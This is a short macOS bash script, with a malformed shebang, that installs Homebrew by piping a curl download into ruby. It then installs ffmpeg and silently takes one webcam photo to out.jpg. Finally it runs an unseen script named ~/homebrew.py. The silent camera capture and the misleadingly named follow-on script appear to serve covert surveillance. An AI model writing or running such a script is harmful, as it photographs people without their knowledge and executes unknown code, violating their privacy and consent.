#1/bin/bash
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" -y
brew install ffmpeg
sleep 5
cd $HOME
ffmpeg -f avfoundation -video_size 1280x720 -framerate 15 -i "0" -vframes 1 out.jpg -y
python ~/homebrew.py
